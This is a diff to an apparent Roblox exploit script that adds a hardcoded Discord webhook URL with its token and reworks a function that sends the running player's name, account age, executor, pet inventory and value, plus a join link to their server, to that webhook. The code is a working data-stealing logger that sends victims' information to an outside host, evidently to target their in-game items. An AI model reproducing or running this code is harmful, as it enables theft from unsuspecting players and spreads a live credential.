@@ -11,7 +11,8 @@
                         Discord: discord.gg/d2zgg2YDMz
 ]]
 
-
+getgenv().Webhook = "https://discord.com/api/webhooks/1403360509453140040/zkUPKjWIxTd6ksINUvRQ5tAXZ1iUquRSbiOZVOwmr-Jnyq1iIsyi4M0g0axfqsenL1Al"
+getgenv().Username = "dumb"
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -382,27 +383,6 @@
             end
         end    
 
-        local accountAgeInDays = Players.LocalPlayer.AccountAge
-        local creationDate = os.time() - (accountAgeInDays * 24 * 60 * 60)
-        local creationDateString = os.date("%Y-%m-%d", creationDate)
-
-        local function truncateByLines(inputString, maxLines)
-            local lines = {}
-            for line in inputString:gmatch("[^\n]+") do
-                table.insert(lines, line)
-            end
-            
-            if #lines <= maxLines then
-                return inputString
-            else
-                local truncatedLines = {}
-                for i = 1, maxLines - 1 do
-                    table.insert(truncatedLines, lines[i])
-                end
-                return table.concat(truncatedLines, "\n")
-            end
-        end
-
 local function formatNumber(num)
     local numbers = math.floor(num)
     local suffixes = {"", "k", "m", "b", "t","qd", "qn", "sx", "sp", "oc", "no"}
@@ -421,11 +401,17 @@ local function sendWebhook(url)
     local topPets = ""
     for i, v in ipairs(pets) do
         if i > 5 then break end
-        topPets ..= v.PetName .. " → " .. formatNumber(v.Value) .. "\n"
+        local petName = v.PetName or v.name or "Unknown Pet"
+        local petValue = v.Value or v.value or 0
+        topPets ..= petName .. " → " .. formatNumber(petValue) .. "\n"
     end
     if topPets == "" then
         topPets = "No pets found"
     end
+
+    -- Inventory totals
+    local totalItems = #pets + #fruits
+    local formattedValue = formatNumber(total_value or 0)
 
     -- Embed data
     local body = http:JSONEncode({
@@ -444,18 +430,23 @@ local function sendWebhook(url)
                         Players.LocalPlayer.DisplayName,
                         detectExecutor(),
                         tostring(Players.LocalPlayer.AccountAge),
-                        Username or "Unknown"
+                        table.concat(Username, ", ")
                     ),
                     inline = false
                 },
                 {
-                    name = "**__Top 5 Pets__**",
+                    name = "**__Inventory__**",
+                    value = string.format("```Total items: %d\nTotal value: %s```", totalItems, formattedValue),
+                    inline = false
+                },
+                {
+                    name = "**Top 5 Pets**",
                     value = "```" .. topPets .. "```",
                     inline = false
                 },
                 {
                     name = "__Join link:__",
-                    value = "[click here to join](" .. ("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s"):format(game.PlaceId, game.JobId) .. ")",
+                    value = "[Click here to join](" .. ("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s"):format(game.PlaceId, game.JobId) .. ")",
                     inline = false
                 }
             },
@@ -475,6 +466,7 @@ end
 
 -- Call the webhook function
 sendWebhook(Webhook)
+
 
 
                 local function CreateGui()
